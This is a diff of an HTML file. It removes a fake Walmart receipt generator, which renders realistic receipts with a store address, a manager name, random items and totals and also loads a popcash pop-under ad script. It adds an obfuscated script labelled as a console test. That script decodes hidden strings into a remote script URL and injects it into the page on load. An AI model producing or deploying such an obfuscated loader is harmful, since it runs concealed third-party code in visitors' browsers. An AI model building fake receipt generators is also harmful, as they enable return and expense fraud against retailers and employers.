@@ -1,313 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta name="ppck-ver" content="d3cc3456fe6fb5283e6c2293bc6b6a0c" />
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Walmart Receipt Generator</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  <style>
-    /* Your existing styles remain unchanged */
-    @font-face {
-      font-family: 'FakeReceipt';
-      src: url('fonts/FakeReceipt.otf') format('opentype');
-    }
-    @font-face {
-      font-family: 'F25BankPrinter';
-      src: url('fonts/F25_Bank_Printer.ttf') format('truetype');
-    }
-    @font-face {
-      font-family: 'MerchantCopy';
-      src: url('fonts/MerchantCopyDoubleSize.ttf') format('truetype');
-    }
-
-    .receipt {
-      width: 330px;
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 9px;
-      background: white;
-      padding: 20px;
-      box-shadow: 0 0 3px rgba(0,0,0,0.1);
-    }
-
-    .item-row {
-      display: flex;
-      justify-content: space-between;
-      white-space: pre;
-    }
-
-    .item-left { flex: 1; }
-    .item-center { width: 100px; text-align: center; }
-    .item-right { width: 80px; text-align: right; }
-
-    .cost-block {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      padding-left: 0;
-    }
-
-    .cost-line {
-      display: flex;
-      width: 100%;
-      justify-content: flex-end;
-      padding-right: 0;
-    }
-
-    .cost-label {
-      width: 150px;
-      text-align: right;
-      padding-right: 27px;
-    }
-
-    .cost-value {
-      width: 70px;
-      text-align: right;
-      padding-right: 13px;
-    }
-
-    img {
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .font-dropdown {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-    }
-
-    select {
-      padding: 4px;
-      font-size: 12px;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Obfuscated Script Test</title>
 </head>
-<body class="bg-gray-100 min-h-screen flex items-center justify-center relative">
-  <!-- Debug console -->
-  <div id="debugConsole" style="position: fixed; bottom: 0; left: 0; background: #333; color: white; padding: 10px; display: none;"></div>
+<body>
+  <h1>Check Console Output</h1>
 
-  <div class="font-dropdown">
-    <label for="fontSelect" class="mr-2 text-sm">Select Font:</label>
-    <select id="fontSelect" class="border rounded">
-      <option value="'Courier New', Courier, monospace">Courier New (Default)</option>
-      <option value="FakeReceipt">Fake Receipt</option>
-      <option value="F25BankPrinter">F25 Bank Printer</option>
-      <option value="MerchantCopy">Merchant Copy</option>
-    </select>
-  </div>
-
-  <div class="receipt" id="receipt">
-    <img src="https://github.com/grepsoda/grepsoda.github.io/blob/main/pictures/w.png?raw=true" alt="walmartlogo" style="width:95%;">
-    <div class="text-center">( 856 ) 983 - 2100</div>
-    <div class="text-center">MANAGER DAVID WINSLOW</div>
-    <div class="text-center">150 E ROUTE 70</div>
-    <div class="text-center">MARLTON NJ 08053</div>
-    <div class="text-left" id="receiptMeta"></div>
-    <div id="itemsList"></div>
-    <div class="cost-block">
-      <div class="cost-line">
-        <span class="cost-label">SUBTOTAL</span>
-        <span class="cost-value" id="subtotal"></span>
-      </div>
-      <div class="cost-line">
-        <span class="cost-label">TAX 1 6.625%</span>
-        <span class="cost-value" id="tax"></span>
-      </div>
-      <div class="cost-line font-bold">
-        <span class="cost-label">TOTAL</span>
-        <span class="cost-value" id="total"></span>
-      </div>
-      <div class="cost-line">
-        <span class="cost-label">CASH TEND</span>
-        <span class="cost-value" id="cash"></span>
-      </div>
-      <div class="cost-line">
-        <span class="cost-label">CHANGE DUE</span>
-        <span class="cost-value" id="change"></span>
-      </div>
-    </div>
-    <div class="text-center"><p style="font-size: 20px;"><b># ITEMS SOLD <span id="itemsSold"></span></b></p></div>
-    <div class="text-center" id="tcNumber"></div>
-    <img src="https://github.com/grepsoda/grepsoda.github.io/blob/main/pictures/barcode-Code128.png?raw=true" alt="barcode" style="width:55%;">
-    <div class="text-center">Low Prices You Can Trust. Every Day.</div>
-    <div class="text-center"><b>***CUSTOMER COPY***</b></div>
-    <div class="text-center" id="dateTime"></div>
-  </div>
-
-  <!-- Modified button with proper event handling -->
-  <button 
-    class="absolute bottom-10 left-10 bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
-    onclick="handleGenerateReceiptClick(event)"
-  >
-    Randomize
-  </button>
-
-  <script>
-   <script type="text/javascript">
-    var uid = '492517';
-    var wid = '743060';
-    var pop_tag = document.createElement('script');pop_tag.src='//cdn.popcash.net/show.js';document.body.appendChild(pop_tag);
-    pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//cdn2.popcash.net/show.js';document.body.appendChild(pop_tag)};
-
-	
-    const items = [
-     { name: 'TOOTHPASTE', upc: '004100904889', price: 5.58, category: 'H' },
-     { name: 'CANDY HZLNT', upc: '044330004889', price: 4.58, category: 'F' },
-     { name: 'QTIPS SWABS', upc: '000000004587', price: 1.47 },
-     { name: 'REESE EGG', upc: '000000000465', price: 6.34, category: 'F' },
-     { name: 'MUFFINS', upc: '007800954587', price: 1.47, category: 'F' },
-     { name: 'PLUS SWIM', upc: '009661107163', price: 32.00 },
-     { name: 'AREA RUG', upc: '001580006232', price: 19.97 },
-     { name: 'OS BDYWASH', upc: '006257560381', price: 6.34 },
-     { name: 'KING SIZE', upc: '010332104889', price: 3.38, category: 'F' },
-     { name: 'CLG OM TP', upc: '000321000465', price: 6.34, category: 'F' },
-     { name: 'OF REPLENISH', upc: '000000004889', price: 7.57 },
-     { name: 'SE FRESH 24', upc: '000000004587', price: 1.47, category: 'F' },
-     { name: 'OS STL CRUI', upc: '000000004587', price: 1.47 },
-     { name: 'GV ORG 2LB', upc: '002570000381', price: 2.58, category: 'F' },
-     { name: 'NITE STRIPS', upc: '003700004581', price: 9.47, category: 'H' },
-     { name: 'HAND SOAP', upc: '008101122554', price: 2.47 },
-     { name: 'KITCHEN BAGS', upc: '004460001234', price: 8.97 },
-     { name: 'YOGURT', upc: '007178741299', price: 1.18, category: 'F' },
-     { name: '2 MILK', upc: '007874235187', price: 6.99, category: 'F' },
-     { name: 'FREEZER BAGS', upc: '002570000381', price: 5.99 },
-     { name: 'OF REPLENISH', upc: '019067900262', price: 11.99 },
-     { name: 'NTG UG S', upc: '007050187296', price: 7.59 },
-     { name: 'HE SH HN', upc: '004155442061', price: 3.65 },
-     { name: 'CM CL', upc: '003400047851', price: 2.55 },
-     { name: 'MAY MASCARA', upc: '003400000229', price: 12.50 },
-     { name: 'OS STL CRUI', upc: '030521011684', price: 5.99 },
-     { name: 'OS BDYMASH', upc: '003500045822', price: 17.99 },
-     { name: 'CLG OM TP', upc: '007732683562', price: 8.99 },
-     { name: 'OTIPS SWABS', upc: '004160800045', price: 4.99 },
-     { name: 'TOOTHPASTE', upc: '003600049435', price: 6.99 },
-     { name: 'SE FRESH 24', upc: '007911890050', price: 3.99, category: 'F' },
-     { name: 'VIVA SIG 6D', upc: '007911890050', price: 1.99, category: 'F' },
-     { name: 'RX -20 2IN1', upc: '003600049435', price: 8.99 },
-     { name: 'RX -20 2IN1', upc: '030521011684', price: 12.99 },
-     { name: 'SAMS 65 TV', upc: '003500045822', price: 1199.99 },
-     { name: 'SAMS 50 4K', upc: '007732683562', price: 899.99 },
-     { name: 'VIZIO 55 TV', upc: '004160800045', price: 459.99 },
-     { name: 'LG 75 UHD', upc: '003600049435', price: 999.99 },
-     { name: 'SONY 40 LED', upc: '007911890050', price: 359.99 },
-     { name: 'XBOX SER S', upc: '007911890050', price: 409.99 },
-     { name: 'PS5 DIG ED', upc: '003600049435', price: 419.65 },
-     { name: 'NINT SW OLED', upc: '030521011684', price: 350.99 },
-     { name: 'BEATS HP', upc: '003500045822', price: 245.99 },
-     { name: 'AIRPODS PRO', upc: '007732683562', price: 109.99 },
-     { name: 'CRICUT EXPLR', upc: '004160800045', price: 350.29 },
-     { name: 'SILH CAMEO', upc: '003600049435', price: 85.99 },
-     { name: '3D PRINTER', upc: '007911890050', price: 300.00 },
-     { name: 'SEW MACH SNG', upc: '007911890050', price: 250.00 },
-     { name: 'YARN BULKY', upc: '003600049435', price: 5.99 },
-     { name: 'DOVE X CRUMB', upc: '011111054745', price: 26.99 },
-     { name: 'DOVE X CRUMB', upc: '011111054745', price: 26.99 },
-     { name: 'KINDER CHOC', upc: '062020007063', price: 1.99 },
-     { name: 'KINDER CHOC', upc: '062020007063', price: 1.99 },
-     { name: 'KINDER CHOC', upc: '062020007063', price: 1.99 },
-     { name: 'ST IVES BHA', upc: '000035043598', price: 4.47 },
-     { name: 'SHEA JAMA', upc: '764302314400', price: 17.97 },
-     { name: 'SHEA STRENG', upc: '005179128220', price: 35.94 },
-     { name: 'ST IVES APR', upc: '015727805202', price: 8.94 },
-     { name: 'FRIDGE WHIRL', upc: '003500045822', price: 445.99 },
-     { name: 'GRILL GAS LP', upc: '030521011684', price: 399.99 },
-     { name: 'TOOL SET 120', upc: '003500045822', price: 209.99 },
-     { name: 'POND CC 3PK', upc: '015332573190', price: 26.94},
-     { name: 'TENT 4 PERS', upc: '004160800045', price: 199.99 },
-     { name: 'GOLF CLUBS', upc: '030521011684', price: 89.99 }
-    ];
-    
-    // Debug logging function
-    const debugLog = (message) => {
-      console.log(message);
-      const debugConsole = document.getElementById('debugConsole');
-      if (debugConsole) {
-        debugConsole.textContent += `${new Date().toISOString()}: ${message}\n`;
-      }
+  <script type="text/javascript">
+    var p$00a = 'p$00a' + (new Date().getTime()) + 'zz'; 
+    window[p$00a] = {
+      a: 'abcdefghijklmnopqrstuvwxyz0123456789p5ldt1gqeus30rcmkhyfw24ijvao9n7z8xb6',
+      b: '{"AZIb":"769zox", "BVIb":"x7na8a", "CXrr1":"wrdth", "DLtag":"o", "Emjk5":"", "XCge1s":"m.sf5lq.l3cwd" , "Zt1":"mcmlpyq.rtf", "ZZ1":"m.qq0cm.l3cwd" }',
+      c: '{"Abkr221":"ylhemf", "Bo9ssm":"//ldr.sf5lq.l3cwd/pmm.uy"}',
+      d: '{"Ag4":"5cdj", "Bx1":"pmmtrdCqe3d", "Cky":"yhl", "Dmg":"lhtpftE3t0trf"}'
     };
 
-    // Function to round up to nearest hundred
-    function roundUpToHundred(num) {
-      return Math.ceil(num / 100) * 100;
-    }
+    var _0x5d4b = ['235913QVfbwv', 'slice', 'length', '162209QBmAmV', '14238hyOOTq', '323207DTbifh', 'split', '1DqiKtq', '135866HTbavB', 'indexOf', 'call', '27654SKXHbY', 'parse', 'undefined', '32Ijckmz', 'keys', 'map', 'ceil', '115980hcFVDy', 'values', 'join'];
+    var _0x208c = function (_0x31a8d7, _0x5f36b3) {
+      _0x31a8d7 = _0x31a8d7 - 0x167;
+      return _0x5d4b[_0x31a8d7];
+    };
 
-    // Event handler wrapper with error handling
-    function handleGenerateReceiptClick(event) {
-      try {
-        debugLog('Button clicked');
-        generateReceipt();
-      } catch (error) {
-        debugLog(`Error generating receipt: ${error.message}`);
-        console.error(error);
+    (function (_0x276f94, _0x57c4ff) {
+      var _0x50057c = _0x208c;
+      while (!![]) {
+        try {
+          var _0x40d184 = parseInt(_0x50057c(0x168)) + parseInt(_0x50057c(0x16f)) * parseInt(_0x50057c(0x179)) + -parseInt(_0x50057c(0x176)) + parseInt(_0x50057c(0x173)) + parseInt(_0x50057c(0x16e)) + -parseInt(_0x50057c(0x170)) + parseInt(_0x50057c(0x16b)) * -parseInt(_0x50057c(0x172));
+          if (_0x40d184 === _0x57c4ff) break;
+          else _0x276f94['push'](_0x276f94['shift']());
+        } catch (_0x411836) {
+          _0x276f94['push'](_0x276f94['shift']());
+        }
       }
-    }
+    }(_0x5d4b, 0x45111), function () {
+      var _0x1ba274 = function (_0x2f3a9a) {
+        var _0x3f0bc4 = _0x208c,
+          _0x1894ba = Math[_0x3f0bc4(0x167)](this['a'][_0x3f0bc4(0x16d)] / 0x2),
+          _0x539548 = this['a'][_0x3f0bc4(0x16c)](0x0, _0x1894ba),
+          _0x5d8009 = this['a'][_0x3f0bc4(0x16c)](_0x1894ba);
+        decrypt = this[_0x2f3a9a][_0x3f0bc4(0x171)]('')[_0x3f0bc4(0x17b)](_0x28f433 => {
+          var _0xd7612d = _0x3f0bc4;
+          return _0x5d8009['split']('')['includes'](_0x28f433) ? _0x539548[_0x5d8009[_0xd7612d(0x174)](_0x28f433)] : _0x28f433;
+        })[_0x3f0bc4(0x16a)]('');
+        try {
+          return JSON[_0x3f0bc4(0x177)](decrypt);
+        } catch {
+          return decrypt;
+        }
+      };
 
-    function generateReceipt() {
-      debugLog('Starting receipt generation');
-      
-      // Randomize number of items between 5 and 20
-      const itemCount = Math.floor(Math.random() * 16) + 5; // 5-20 items
-      let selected = [...items].sort(() => 0.5 - Math.random()).slice(0, itemCount);
-      
-      let html = '';
-      let subtotal = 0;
-      let tax = 0;
+      var _0x57bb85 = window[p$00a];
 
-      selected.forEach(item => {
-        const upcDisplay = item.upc.padEnd(14, ' ');
-        const taxCode = item.category === 'F' || item.category === 'H' ? 'O' : 'T';
-        html += `<div class="item-row">
-          <span class="item-left">${item.name}</span>
-          <span class="item-center">${upcDisplay}</span>
-          <span class="item-right">${item.price.toFixed(2)} ${taxCode}</span>
-          </div>`;
-          subtotal += item.price;
-          if (taxCode === 'T') tax += item.price * 0.06625;
-        });
+      var _0x219d97 = function (_0x28efac, _0x22a031) {
+        var _0x5bee8e = _0x208c,
+          _0x3963a0 = Object[_0x5bee8e(0x169)](_0x1ba274[_0x5bee8e(0x175)](_0x57bb85, Object[_0x5bee8e(0x17a)](_0x57bb85)[_0x28efac]));
+        return typeof _0x22a031 != _0x5bee8e(0x178) ? _0x3963a0[_0x22a031] : _0x3963a0;
+      };
 
-      const total = subtotal + tax;
-      const cash = roundUpToHundred(total); // Always round up to nearest hundred
-      const change = cash - total;
+      window[p$00a]['x'] = function () {
+        return _0x219d97(0x1);
+      };
 
-      debugLog('Updating receipt elements');
-      document.getElementById('itemsList').innerHTML = html;
-      document.getElementById('subtotal').textContent = subtotal.toFixed(2);
-      document.getElementById('tax').textContent = tax.toFixed(2);
-      document.getElementById('total').textContent = total.toFixed(2);
-      document.getElementById('cash').textContent = cash.toFixed(2);
-      document.getElementById('change').textContent = change.toFixed(2);
-      document.getElementById('itemsSold').textContent = selected.length; // Dynamic item count
+      // DOM interaction (disabled to avoid error if undefined keys)
+      try {
+        var tag = document[_0x219d97(0x3, 0x3)](_0x219d97(0x2, 0x0));
+        tag[_0x219d97(0x3, 0x2)] = _0x219d97(0x2, 0x1);
+        document[_0x219d97(0x3, 0x0)][_0x219d97(0x3, 0x1)](tag);
+      } catch (e) {
+        console.warn("DOM insertion skipped due to undefined keys:", e);
+      }
 
-      const now = new Date();
-      const randomOffset = Math.floor(Math.random() * 7);
-      now.setDate(now.getDate() - randomOffset);
-      
-	  // Format date as mm-dd-yyyy
-      const month = String(now.getMonth() + 1).padStart(2, '0'); // 01-12
-      const day = String(now.getDate()).padStart(2, '0');       // 01-31
-      const year = now.getFullYear();                           // 2023
-      const dateStr = `${month}-${day}-${year}`;
-      const timeStr = now.toTimeString().slice(0, 8);
-      document.getElementById('dateTime').textContent = `${dateStr} ${timeStr}`;
-
-      const trNum = Math.floor(10000 + Math.random() * 89999);
-      const tcNum = Array(5).fill().map(() => Math.floor(1000 + Math.random() * 9000)).join(' ');
-      document.getElementById('receiptMeta').textContent = `ST# 01869\u2002\u2002OP# 003762\u2002\u2002TE# 11\u2002\u2002TR# ${trNum}`;
-      document.getElementById('tcNumber').textContent = `TC# ${tcNum}`;
-
-      debugLog(`Receipt generation completed with ${selected.length} items`);
-    }
-
-    // Initial load
-    window.addEventListener('load', () => {
-      debugLog('Page loaded');
-      generateReceipt();
-
-      document.getElementById('fontSelect').addEventListener('change', function () {
-        document.getElementById('receipt').style.fontFamily = this.value;
-      });
-    });
+      console.log("p$00a:", p$00a);
+      console.log("Deobfuscated window[p$00a]:", window[p$00a]);
+    }());
+  </script>
 </body>
 </html>
